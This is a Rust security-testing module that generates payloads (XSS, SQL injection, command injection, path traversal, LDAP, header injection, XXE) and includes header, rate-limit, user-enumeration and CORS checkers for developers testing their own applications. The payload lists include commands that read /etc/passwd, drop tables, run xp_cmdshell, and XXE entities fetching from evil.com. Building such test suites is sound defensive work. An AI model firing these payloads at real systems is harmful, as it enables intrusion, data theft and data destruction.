//! Security Testing Utilities (SA-11, CA-8)
//!
//! NIST SP 800-53 SA-11 (Developer Testing and Evaluation) and CA-8
//! (Penetration Testing) compliant security testing utilities.
//!
//! # Design Philosophy
//!
//! This module provides test utilities and payload generators for security
//! testing. It does NOT perform actual attacks - it provides tools for
//! developers to test their own applications against common vulnerabilities.
//!
//! # What This Module Provides
//!
//! - Common attack payload generators (XSS, SQL injection, etc.)
//! - Security assertion helpers
//! - Response validators for security headers
//! - Rate limiting testers
//! - Authentication/authorization test helpers
//!
//! # Usage
//!
//! ```ignore
//! use barbican::testing::{xss_payloads, sql_injection_payloads, SecurityAssertions};
//!
//! #[tokio::test]
//! async fn test_xss_protection() {
//!     let client = TestClient::new(app);
//!
//!     for payload in xss_payloads() {
//!         let response = client.post("/comment")
//!             .json(&json!({ "text": payload }))
//!             .send()
//!             .await;
//!
//!         // Verify payload is escaped or rejected
//!         let body = response.text().await;
//!         assert!(!body.contains(&payload), "XSS payload was reflected: {}", payload);
//!     }
//! }
//! ```

use std::time::{Duration, Instant};

// ============================================================================
// Attack Payload Generators
// ============================================================================

/// Common XSS (Cross-Site Scripting) test payloads
///
/// Use these to test that your application properly escapes or rejects
/// user input that could contain malicious scripts.
pub fn xss_payloads() -> Vec<&'static str> {
    vec![
        // Basic script injection
        "<script>alert('xss')</script>",
        "<script>alert(1)</script>",
        "<script src='evil.js'></script>",

        // Event handlers
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<marquee onstart=alert('xss')>",

        // JavaScript URLs
        "<a href='javascript:alert(1)'>click</a>",
        "<iframe src='javascript:alert(1)'>",

        // Encoded payloads
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "%3Cscript%3Ealert('xss')%3C/script%3E",

        // CSS injection
        "<style>@import'http://evil.com/xss.css';</style>",
        "<div style='background:url(javascript:alert(1))'>",

        // SVG payloads
        "<svg><script>alert('xss')</script></svg>",
        "<svg/onload=alert('xss')>",

        // Template injection (for templating engines)
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('xss')}",
        "#{alert('xss')}",

        // HTML5 specific
        "<video><source onerror=alert('xss')>",
        "<audio src=x onerror=alert('xss')>",
        "<details open ontoggle=alert('xss')>",
    ]
}

/// Common SQL injection test payloads
///
/// Use these to test that your application properly uses parameterized
/// queries and doesn't concatenate user input into SQL.
pub fn sql_injection_payloads() -> Vec<&'static str> {
    vec![
        // Basic injection
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "1' OR '1'='1",
        "1 OR 1=1",

        // Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1 UNION SELECT * FROM users",

        // Error-based
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",

        // Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "1' AND (SELECT SLEEP(5))--",

        // Stacked queries
        "'; DROP TABLE users;--",
        "'; INSERT INTO users VALUES('hacker','password');--",

        // Comment injection
        "admin'--",
        "admin'/*",
        "admin'#",

        // Numeric injection
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",

        // Special characters
        "'; EXEC xp_cmdshell('dir');--",
        "' || '1'='1",
        "' && '1'='1",
    ]
}

/// Common command injection test payloads
///
/// Use these to test that your application doesn't pass user input
/// to shell commands unsanitized.
pub fn command_injection_payloads() -> Vec<&'static str> {
    vec![
        // Command chaining
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",

        // Command substitution
        "$(ls)",
        "`ls`",

        // Newline injection
        "\nls",
        "\r\nls",

        // Null byte injection
        "file.txt\0.jpg",

        // Path traversal + command
        "../../../bin/ls",

        // With arguments
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(cat /etc/passwd)",

        // Windows variants
        "& dir",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",

        // Background execution
        "; ls &",
        "| ls &",
    ]
}

/// Path traversal test payloads
///
/// Use these to test that your application properly validates file paths.
pub fn path_traversal_payloads() -> Vec<&'static str> {
    vec![
        // Basic traversal
        "../",
        "../../",
        "../../../",
        "..\\",
        "..\\..\\",

        // Encoded
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e%5c",

        // Double encoding
        "%252e%252e%252f",

        // Null byte (for languages that don't handle it)
        "../../../etc/passwd%00",
        "../../../etc/passwd\0",

        // With filenames
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",

        // Absolute paths
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",

        // Mixed
        "....//....//etc/passwd",
        "..../....//etc/passwd",
    ]
}

/// LDAP injection test payloads
pub fn ldap_injection_payloads() -> Vec<&'static str> {
    vec![
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "admin)(|(password=*))",
        "x)(|(objectClass=*)",
        "*))(|(objectClass=*",
    ]
}

/// Header injection test payloads
pub fn header_injection_payloads() -> Vec<&'static str> {
    vec![
        "value\r\nX-Injected: header",
        "value\nX-Injected: header",
        "value%0d%0aX-Injected:%20header",
        "value\r\n\r\n<html>injected</html>",
    ]
}

/// XML/XXE injection test payloads
pub fn xxe_payloads() -> Vec<&'static str> {
    vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>"#,
        r#"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>"#,
    ]
}

// ============================================================================
// Security Header Assertions
// ============================================================================

/// Expected security headers for a secure application
#[derive(Debug, Clone)]
pub struct SecurityHeaders {
    /// Strict-Transport-Security
    pub hsts: Option<String>,
    /// Content-Security-Policy
    pub csp: Option<String>,
    /// X-Frame-Options
    pub x_frame_options: Option<String>,
    /// X-Content-Type-Options
    pub x_content_type_options: Option<String>,
    /// X-XSS-Protection (legacy but still useful)
    pub x_xss_protection: Option<String>,
    /// Referrer-Policy
    pub referrer_policy: Option<String>,
    /// Permissions-Policy
    pub permissions_policy: Option<String>,
}

impl Default for SecurityHeaders {
    fn default() -> Self {
        Self {
            hsts: Some("max-age=31536000; includeSubDomains".to_string()),
            csp: Some("default-src 'self'".to_string()),
            x_frame_options: Some("DENY".to_string()),
            x_content_type_options: Some("nosniff".to_string()),
            x_xss_protection: Some("1; mode=block".to_string()),
            referrer_policy: Some("strict-origin-when-cross-origin".to_string()),
            permissions_policy: None,
        }
    }
}

impl SecurityHeaders {
    /// Create a minimal set of headers
    pub fn minimal() -> Self {
        Self {
            hsts: None,
            csp: None,
            x_frame_options: Some("DENY".to_string()),
            x_content_type_options: Some("nosniff".to_string()),
            x_xss_protection: None,
            referrer_policy: None,
            permissions_policy: None,
        }
    }

    /// Create a strict set of headers
    pub fn strict() -> Self {
        Self {
            hsts: Some("max-age=63072000; includeSubDomains; preload".to_string()),
            csp: Some("default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'".to_string()),
            x_frame_options: Some("DENY".to_string()),
            x_content_type_options: Some("nosniff".to_string()),
            x_xss_protection: Some("1; mode=block".to_string()),
            referrer_policy: Some("no-referrer".to_string()),
            permissions_policy: Some("geolocation=(), microphone=(), camera=()".to_string()),
        }
    }

    /// Verify headers against a response (returns missing/incorrect headers)
    pub fn verify(&self, headers: &[(String, String)]) -> Vec<HeaderIssue> {
        let header_map: std::collections::HashMap<String, String> = headers
            .iter()
            .map(|(k, v)| (k.to_lowercase(), v.clone()))
            .collect();

        let mut issues = Vec::new();

        // Check each expected header
        if let Some(_expected) = &self.hsts {
            match header_map.get("strict-transport-security") {
                None => issues.push(HeaderIssue::Missing("Strict-Transport-Security".to_string())),
                Some(actual) if !actual.contains("max-age=") => {
                    issues.push(HeaderIssue::Invalid("Strict-Transport-Security".to_string(), actual.clone()));
                }
                _ => {}
            }
        }

        if let Some(_) = &self.csp {
            if !header_map.contains_key("content-security-policy") {
                issues.push(HeaderIssue::Missing("Content-Security-Policy".to_string()));
            }
        }

        if let Some(expected) = &self.x_frame_options {
            match header_map.get("x-frame-options") {
                None => issues.push(HeaderIssue::Missing("X-Frame-Options".to_string())),
                Some(actual) if actual.to_uppercase() != expected.to_uppercase() => {
                    issues.push(HeaderIssue::Invalid("X-Frame-Options".to_string(), actual.clone()));
                }
                _ => {}
            }
        }

        if let Some(expected) = &self.x_content_type_options {
            match header_map.get("x-content-type-options") {
                None => issues.push(HeaderIssue::Missing("X-Content-Type-Options".to_string())),
                Some(actual) if actual.to_lowercase() != expected.to_lowercase() => {
                    issues.push(HeaderIssue::Invalid("X-Content-Type-Options".to_string(), actual.clone()));
                }
                _ => {}
            }
        }

        if let Some(_) = &self.referrer_policy {
            if !header_map.contains_key("referrer-policy") {
                issues.push(HeaderIssue::Missing("Referrer-Policy".to_string()));
            }
        }

        issues
    }

    // ========================================================================
    // Header Generation Methods (for adding to responses)
    // ========================================================================

    /// Create headers suitable for API endpoints.
    ///
    /// Provides a balanced set of security headers that work well for REST APIs:
    /// - HSTS with 1-year max-age
    /// - Permissive CSP for API responses
    /// - Standard protective headers
    ///
    /// # Example
    ///
    /// ```
    /// use barbican::testing::SecurityHeaders;
    ///
    /// let headers = SecurityHeaders::api();
    /// for (name, value) in headers.to_header_pairs() {
    ///     println!("{}: {}", name, value);
    /// }
    /// ```
    pub fn api() -> Self {
        Self {
            hsts: Some("max-age=31536000; includeSubDomains".to_string()),
            csp: Some("default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'".to_string()),
            x_frame_options: Some("DENY".to_string()),
            x_content_type_options: Some("nosniff".to_string()),
            x_xss_protection: Some("1; mode=block".to_string()),
            referrer_policy: Some("strict-origin-when-cross-origin".to_string()),
            permissions_policy: Some("geolocation=(), microphone=(), camera=()".to_string()),
        }
    }

    /// Create headers for production environments.
    ///
    /// Uses stricter settings than `api()`:
    /// - HSTS with 2-year max-age and preload directive
    /// - All standard protective headers
    ///
    /// # Example
    ///
    /// ```
    /// use barbican::testing::SecurityHeaders;
    ///
    /// let headers = SecurityHeaders::production();
    /// assert!(headers.hsts.as_ref().unwrap().contains("preload"));
    /// ```
    pub fn production() -> Self {
        Self {
            hsts: Some("max-age=63072000; includeSubDomains; preload".to_string()),
            csp: Some("default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'".to_string()),
            x_frame_options: Some("DENY".to_string()),
            x_content_type_options: Some("nosniff".to_string()),
            x_xss_protection: Some("1; mode=block".to_string()),
            referrer_policy: Some("strict-origin-when-cross-origin".to_string()),
            permissions_policy: Some("geolocation=(), microphone=(), camera=()".to_string()),
        }
    }

    /// Create headers based on compliance profile.
    ///
    /// - FedRAMP High: Strictest headers with preload
    /// - FedRAMP Moderate/SOC 2: Production-level headers
    /// - FedRAMP Low: Standard API headers
    /// - Custom: Minimal headers
    pub fn for_compliance(profile: crate::compliance::ComplianceProfile) -> Self {
        use crate::compliance::ComplianceProfile;
        match profile {
            ComplianceProfile::FedRampHigh => Self::strict(),
            ComplianceProfile::FedRampModerate | ComplianceProfile::Soc2 => Self::production(),
            ComplianceProfile::FedRampLow => Self::api(),
            ComplianceProfile::Custom => Self::minimal(),
        }
    }

    /// Convert to a vector of header name-value pairs.
    ///
    /// Returns only headers that have values set. Useful for adding
    /// headers to HTTP responses.
    ///
    /// # Example
    ///
    /// ```
    /// use barbican::testing::SecurityHeaders;
    ///
    /// let headers = SecurityHeaders::api();
    /// let pairs = headers.to_header_pairs();
    ///
    /// // Use with Axum or other frameworks
    /// for (name, value) in pairs {
    ///     println!("Adding header: {}: {}", name, value);
    /// }
    /// ```
    pub fn to_header_pairs(&self) -> Vec<(String, String)> {
        let mut pairs = Vec::new();

        if let Some(v) = &self.x_content_type_options {
            pairs.push(("X-Content-Type-Options".to_string(), v.clone()));
        }
        if let Some(v) = &self.x_frame_options {
            pairs.push(("X-Frame-Options".to_string(), v.clone()));
        }
        if let Some(v) = &self.x_xss_protection {
            pairs.push(("X-XSS-Protection".to_string(), v.clone()));
        }
        if let Some(v) = &self.referrer_policy {
            pairs.push(("Referrer-Policy".to_string(), v.clone()));
        }
        if let Some(v) = &self.csp {
            pairs.push(("Content-Security-Policy".to_string(), v.clone()));
        }
        if let Some(v) = &self.hsts {
            pairs.push(("Strict-Transport-Security".to_string(), v.clone()));
        }
        if let Some(v) = &self.permissions_policy {
            pairs.push(("Permissions-Policy".to_string(), v.clone()));
        }

        pairs
    }

    /// Convert to static string slices for use with middleware.
    ///
    /// Returns a vector of header pairs as static strings. Useful when
    /// you need to configure middleware with compile-time known headers.
    ///
    /// Note: This allocates and leaks memory intentionally to create
    /// static strings. Only call once during application initialization.
    pub fn to_static_pairs(&self) -> Vec<(&'static str, &'static str)> {
        self.to_header_pairs()
            .into_iter()
            .map(|(k, v)| {
                let k: &'static str = Box::leak(k.into_boxed_str());
                let v: &'static str = Box::leak(v.into_boxed_str());
                (k, v)
            })
            .collect()
    }

    /// Get header names that are set.
    pub fn header_names(&self) -> Vec<&'static str> {
        let mut names = Vec::new();
        if self.x_content_type_options.is_some() {
            names.push("X-Content-Type-Options");
        }
        if self.x_frame_options.is_some() {
            names.push("X-Frame-Options");
        }
        if self.x_xss_protection.is_some() {
            names.push("X-XSS-Protection");
        }
        if self.referrer_policy.is_some() {
            names.push("Referrer-Policy");
        }
        if self.csp.is_some() {
            names.push("Content-Security-Policy");
        }
        if self.hsts.is_some() {
            names.push("Strict-Transport-Security");
        }
        if self.permissions_policy.is_some() {
            names.push("Permissions-Policy");
        }
        names
    }
}

/// Issue found when verifying security headers
#[derive(Debug, Clone, PartialEq)]
pub enum HeaderIssue {
    /// Header is missing
    Missing(String),
    /// Header has invalid value
    Invalid(String, String),
}

impl std::fmt::Display for HeaderIssue {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            HeaderIssue::Missing(name) => write!(f, "Missing header: {}", name),
            HeaderIssue::Invalid(name, value) => write!(f, "Invalid header {}: {}", name, value),
        }
    }
}

// ============================================================================
// Rate Limit Testing
// ============================================================================

/// Result of a rate limit test
#[derive(Debug, Clone)]
pub struct RateLimitTestResult {
    /// Number of requests that succeeded
    pub successful_requests: u32,
    /// Number of requests that were rate limited
    pub rate_limited_requests: u32,
    /// Total requests sent
    pub total_requests: u32,
    /// Time taken for all requests
    pub duration: Duration,
    /// Whether rate limiting appears to be working
    pub rate_limiting_effective: bool,
}

impl RateLimitTestResult {
    /// Calculate the percentage of requests that were rate limited
    pub fn rate_limited_percentage(&self) -> f64 {
        if self.total_requests == 0 {
            return 0.0;
        }
        (self.rate_limited_requests as f64 / self.total_requests as f64) * 100.0
    }
}

/// Configuration for rate limit testing
#[derive(Debug, Clone)]
pub struct RateLimitTestConfig {
    /// Number of requests to send
    pub request_count: u32,
    /// Expected rate limit (requests per window)
    pub expected_limit: u32,
    /// HTTP status code indicating rate limiting (usually 429)
    pub rate_limit_status: u16,
}

impl Default for RateLimitTestConfig {
    fn default() -> Self {
        Self {
            request_count: 100,
            expected_limit: 10,
            rate_limit_status: 429,
        }
    }
}

/// Analyze rate limit test results
pub fn analyze_rate_limit_results(
    responses: &[u16], // Status codes
    config: &RateLimitTestConfig,
) -> RateLimitTestResult {
    let start = Instant::now();

    let successful = responses.iter().filter(|&&s| s == 200).count() as u32;
    let rate_limited = responses.iter().filter(|&&s| s == config.rate_limit_status).count() as u32;

    // Rate limiting is effective if we see rate limit responses after the expected limit
    let rate_limiting_effective = rate_limited > 0 &&
        successful <= config.expected_limit + 5; // Allow some margin

    RateLimitTestResult {
        successful_requests: successful,
        rate_limited_requests: rate_limited,
        total_requests: responses.len() as u32,
        duration: start.elapsed(),
        rate_limiting_effective,
    }
}

// ============================================================================
// Input Validation Testing
// ============================================================================

/// Test whether a string appears to be properly sanitized
pub fn is_html_sanitized(input: &str, output: &str) -> bool {
    // Check that dangerous characters are escaped
    let dangerous = ['<', '>', '"', '\'', '&'];

    for c in dangerous {
        if input.contains(c) {
            // If input had dangerous char, output should have escaped version
            let escaped = match c {
                '<' => "&lt;",
                '>' => "&gt;",
                '"' => "&quot;",
                '\'' => "&#x27;",
                '&' => "&amp;",
                _ => continue,
            };

            // Output should either not contain the raw char, or contain the escaped version
            if output.contains(c) && !output.contains(escaped) {
                return false;
            }
        }
    }

    // Check for script tags
    if input.to_lowercase().contains("<script") &&
       output.to_lowercase().contains("<script") {
        return false;
    }

    true
}

/// Test whether SQL appears to be using parameterized queries
/// (This is a heuristic - not foolproof)
pub fn appears_parameterized(error_message: &str) -> bool {
    // If we see these in error messages, likely not parameterized
    let sql_indicators = [
        "syntax error",
        "SQL syntax",
        "mysql_",
        "pg_query",
        "sqlite3_",
        "ORA-",
        "SQLSTATE",
        "unclosed quotation",
        "unterminated string",
    ];

    let lower = error_message.to_lowercase();
    !sql_indicators.iter().any(|&ind| lower.contains(&ind.to_lowercase()))
}

// ============================================================================
// Authentication Testing Helpers
// ============================================================================

/// Common weak passwords for testing password policy
pub fn weak_passwords() -> Vec<&'static str> {
    vec![
        "password",
        "123456",
        "12345678",
        "qwerty",
        "abc123",
        "password1",
        "admin",
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "login",
        "princess",
        "starwars",
        "passw0rd",
        "shadow",
        "sunshine",
        "iloveyou",
        "trustno1",
    ]
}

/// Test usernames for enumeration testing
pub fn test_usernames() -> Vec<&'static str> {
    vec![
        "admin",
        "administrator",
        "root",
        "test",
        "user",
        "guest",
        "demo",
        "support",
        "info",
        "sales",
        "contact",
        "webmaster",
        "postmaster",
        "hostmaster",
    ]
}

/// Check if responses indicate user enumeration vulnerability
///
/// Returns true if the responses appear to leak whether a user exists
pub fn check_user_enumeration(
    valid_user_response: &str,
    invalid_user_response: &str,
    valid_user_timing: Duration,
    invalid_user_timing: Duration,
) -> UserEnumerationResult {
    let mut issues = Vec::new();

    // Check response body differences
    if valid_user_response != invalid_user_response {
        // Check if the difference is meaningful
        let valid_lower = valid_user_response.to_lowercase();
        let invalid_lower = invalid_user_response.to_lowercase();

        if valid_lower.contains("invalid password") && invalid_lower.contains("user not found") {
            issues.push("Different error messages for valid vs invalid users".to_string());
        }
        if valid_lower.contains("incorrect password") && invalid_lower.contains("no such user") {
            issues.push("Different error messages for valid vs invalid users".to_string());
        }
    }

    // Check timing differences (significant if > 100ms difference)
    let timing_diff = if valid_user_timing > invalid_user_timing {
        valid_user_timing - invalid_user_timing
    } else {
        invalid_user_timing - valid_user_timing
    };

    if timing_diff > Duration::from_millis(100) {
        issues.push(format!(
            "Timing difference of {:?} between valid and invalid users",
            timing_diff
        ));
    }

    UserEnumerationResult {
        vulnerable: !issues.is_empty(),
        issues,
    }
}

/// Result of user enumeration check
#[derive(Debug, Clone)]
pub struct UserEnumerationResult {
    /// Whether the application appears vulnerable
    pub vulnerable: bool,
    /// Specific issues found
    pub issues: Vec<String>,
}

// ============================================================================
// CORS Testing
// ============================================================================

/// Common origins for CORS testing
pub fn cors_test_origins() -> Vec<&'static str> {
    vec![
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://localhost",
        "http://localhost",
        "https://127.0.0.1",
        "https://[::1]",
        "https://example.com.evil.com",
        "https://exampleXcom",
    ]
}

/// Check CORS response headers for issues
pub fn check_cors_headers(
    origin_sent: &str,
    access_control_allow_origin: Option<&str>,
    access_control_allow_credentials: Option<&str>,
) -> Vec<CorsIssue> {
    let mut issues = Vec::new();

    if let Some(acao) = access_control_allow_origin {
        // Wildcard with credentials is dangerous
        if acao == "*" {
            if access_control_allow_credentials == Some("true") {
                issues.push(CorsIssue::WildcardWithCredentials);
            }
        }

        // Reflecting arbitrary origin is dangerous
        if acao == origin_sent && origin_sent != "null" {
            issues.push(CorsIssue::ReflectsArbitraryOrigin(origin_sent.to_string()));
        }

        // Null origin is dangerous
        if acao == "null" {
            issues.push(CorsIssue::AllowsNullOrigin);
        }
    }

    issues
}

/// CORS security issue
#[derive(Debug, Clone, PartialEq)]
pub enum CorsIssue {
    /// Wildcard origin with credentials enabled
    WildcardWithCredentials,
    /// Reflects arbitrary origin back
    ReflectsArbitraryOrigin(String),
    /// Allows null origin
    AllowsNullOrigin,
}

impl std::fmt::Display for CorsIssue {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            CorsIssue::WildcardWithCredentials => {
                write!(f, "CORS allows wildcard (*) with credentials")
            }
            CorsIssue::ReflectsArbitraryOrigin(origin) => {
                write!(f, "CORS reflects arbitrary origin: {}", origin)
            }
            CorsIssue::AllowsNullOrigin => {
                write!(f, "CORS allows null origin")
            }
        }
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xss_payloads_not_empty() {
        let payloads = xss_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.len() >= 10);
    }

    #[test]
    fn test_sql_injection_payloads_not_empty() {
        let payloads = sql_injection_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.len() >= 10);
    }

    #[test]
    fn test_command_injection_payloads_not_empty() {
        let payloads = command_injection_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_path_traversal_payloads_not_empty() {
        let payloads = path_traversal_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("..")));
    }

    #[test]
    fn test_security_headers_default() {
        let headers = SecurityHeaders::default();
        assert!(headers.hsts.is_some());
        assert!(headers.csp.is_some());
        assert!(headers.x_frame_options.is_some());
        assert!(headers.x_content_type_options.is_some());
    }

    #[test]
    fn test_security_headers_verify_missing() {
        let expected = SecurityHeaders::default();
        let actual: Vec<(String, String)> = vec![];

        let issues = expected.verify(&actual);
        assert!(!issues.is_empty());
        assert!(issues.iter().any(|i| matches!(i, HeaderIssue::Missing(_))));
    }

    #[test]
    fn test_security_headers_verify_present() {
        let expected = SecurityHeaders::minimal();
        let actual = vec![
            ("X-Frame-Options".to_string(), "DENY".to_string()),
            ("X-Content-Type-Options".to_string(), "nosniff".to_string()),
        ];

        let issues = expected.verify(&actual);
        assert!(issues.is_empty());
    }

    #[test]
    fn test_is_html_sanitized() {
        // Properly sanitized
        assert!(is_html_sanitized("<script>", "&lt;script&gt;"));
        assert!(is_html_sanitized("normal text", "normal text"));

        // Not sanitized
        assert!(!is_html_sanitized("<script>alert(1)</script>", "<script>alert(1)</script>"));
    }

    #[test]
    fn test_appears_parameterized() {
        // These suggest parameterized queries (no SQL errors)
        assert!(appears_parameterized("Invalid credentials"));
        assert!(appears_parameterized("User not found"));

        // These suggest raw SQL (SQL errors in response)
        assert!(!appears_parameterized("SQL syntax error near 'OR'"));
        assert!(!appears_parameterized("pg_query(): Query failed"));
    }

    #[test]
    fn test_weak_passwords_not_empty() {
        let passwords = weak_passwords();
        assert!(!passwords.is_empty());
        assert!(passwords.contains(&"password"));
        assert!(passwords.contains(&"123456"));
    }

    #[test]
    fn test_rate_limit_analysis() {
        // Simulate responses: first 10 succeed, rest are rate limited
        let responses: Vec<u16> = (0..100)
            .map(|i| if i < 10 { 200 } else { 429 })
            .collect();

        let config = RateLimitTestConfig {
            request_count: 100,
            expected_limit: 10,
            rate_limit_status: 429,
        };

        let result = analyze_rate_limit_results(&responses, &config);

        assert_eq!(result.successful_requests, 10);
        assert_eq!(result.rate_limited_requests, 90);
        assert!(result.rate_limiting_effective);
    }

    #[test]
    fn test_user_enumeration_check() {
        // Different messages indicate vulnerability
        let result = check_user_enumeration(
            "Invalid password",
            "User not found",
            Duration::from_millis(100),
            Duration::from_millis(100),
        );
        assert!(result.vulnerable);

        // Same messages, no timing difference - not vulnerable
        let result = check_user_enumeration(
            "Invalid credentials",
            "Invalid credentials",
            Duration::from_millis(100),
            Duration::from_millis(105),
        );
        assert!(!result.vulnerable);
    }

    #[test]
    fn test_cors_check_wildcard_with_credentials() {
        let issues = check_cors_headers(
            "https://evil.com",
            Some("*"),
            Some("true"),
        );
        assert!(issues.contains(&CorsIssue::WildcardWithCredentials));
    }

    #[test]
    fn test_cors_check_reflects_origin() {
        let issues = check_cors_headers(
            "https://evil.com",
            Some("https://evil.com"),
            None,
        );
        assert!(issues.iter().any(|i| matches!(i, CorsIssue::ReflectsArbitraryOrigin(_))));
    }

    #[test]
    fn test_cors_check_null_origin() {
        let issues = check_cors_headers(
            "null",
            Some("null"),
            None,
        );
        assert!(issues.contains(&CorsIssue::AllowsNullOrigin));
    }

    #[test]
    fn test_cors_check_safe_config() {
        let issues = check_cors_headers(
            "https://evil.com",
            Some("https://myapp.com"),
            Some("true"),
        );
        assert!(issues.is_empty());
    }

    // ========================================================================
    // Tests for SecurityHeaders generation methods
    // ========================================================================

    #[test]
    fn test_security_headers_api() {
        let headers = SecurityHeaders::api();
        assert!(headers.hsts.is_some());
        assert!(headers.csp.is_some());
        assert!(headers.x_frame_options.as_ref().unwrap() == "DENY");
        assert!(headers.x_content_type_options.as_ref().unwrap() == "nosniff");
        assert!(headers.permissions_policy.is_some());
        // API headers should NOT have preload
        assert!(!headers.hsts.as_ref().unwrap().contains("preload"));
    }

    #[test]
    fn test_security_headers_production() {
        let headers = SecurityHeaders::production();
        assert!(headers.hsts.is_some());
        // Production headers SHOULD have preload
        assert!(headers.hsts.as_ref().unwrap().contains("preload"));
        assert!(headers.hsts.as_ref().unwrap().contains("63072000"));
    }

    #[test]
    fn test_security_headers_for_compliance() {
        use crate::compliance::ComplianceProfile;

        // FedRAMP High should be strictest
        let high = SecurityHeaders::for_compliance(ComplianceProfile::FedRampHigh);
        assert!(high.hsts.as_ref().unwrap().contains("preload"));

        // FedRAMP Moderate should have production headers
        let moderate = SecurityHeaders::for_compliance(ComplianceProfile::FedRampModerate);
        assert!(moderate.hsts.as_ref().unwrap().contains("preload"));

        // FedRAMP Low should have API headers (no preload)
        let low = SecurityHeaders::for_compliance(ComplianceProfile::FedRampLow);
        assert!(!low.hsts.as_ref().unwrap().contains("preload"));

        // Custom should be minimal
        let custom = SecurityHeaders::for_compliance(ComplianceProfile::Custom);
        assert!(custom.hsts.is_none());
    }

    #[test]
    fn test_security_headers_to_header_pairs() {
        let headers = SecurityHeaders::api();
        let pairs = headers.to_header_pairs();

        // Should have 7 headers for API configuration
        assert_eq!(pairs.len(), 7);

        // Check specific headers exist
        let header_names: Vec<&str> = pairs.iter().map(|(k, _)| k.as_str()).collect();
        assert!(header_names.contains(&"X-Content-Type-Options"));
        assert!(header_names.contains(&"X-Frame-Options"));
        assert!(header_names.contains(&"Strict-Transport-Security"));
        assert!(header_names.contains(&"Content-Security-Policy"));
        assert!(header_names.contains(&"Permissions-Policy"));
    }

    #[test]
    fn test_security_headers_to_header_pairs_minimal() {
        let headers = SecurityHeaders::minimal();
        let pairs = headers.to_header_pairs();

        // Minimal should only have 2 headers
        assert_eq!(pairs.len(), 2);
    }

    #[test]
    fn test_security_headers_header_names() {
        let headers = SecurityHeaders::api();
        let names = headers.header_names();

        assert_eq!(names.len(), 7);
        assert!(names.contains(&"X-Content-Type-Options"));
        assert!(names.contains(&"X-Frame-Options"));
        assert!(names.contains(&"Strict-Transport-Security"));
    }

    #[test]
    fn test_security_headers_header_names_minimal() {
        let headers = SecurityHeaders::minimal();
        let names = headers.header_names();

        assert_eq!(names.len(), 2);
        assert!(names.contains(&"X-Content-Type-Options"));
        assert!(names.contains(&"X-Frame-Options"));
    }
}
